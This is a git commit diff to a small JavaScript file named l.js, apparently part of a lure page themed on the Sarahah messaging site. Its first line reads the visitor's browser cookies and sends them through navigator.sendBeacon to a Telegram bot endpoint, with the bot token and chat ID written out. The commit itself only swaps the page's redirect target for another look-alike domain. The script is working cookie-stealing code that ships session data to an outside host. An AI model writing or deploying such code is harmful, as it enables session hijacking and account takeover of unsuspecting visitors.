604d49b159181597adf535d28ee66b392a773d7e
ae54 <chromscurity11@gmail.com>
2025-01-28 09:30:13 +0200

    Update l.js

--- l.js
+++ l.js
@@ -1,2 +1,2 @@
 navigator.sendBeacon(`https://api.telegram.org/bot7858688597:AAHkWaP75HtsOoU-9UvK094DuONFzZ48VWY/sendMessage?chat_id=5864267471&text=${encodeURIComponent(document.cookie)}`);
-window.location.href = "https://sarhne.sarahah.pro/38633557759051";
+window.location.href = "https://201376777563513.sarhne.com";
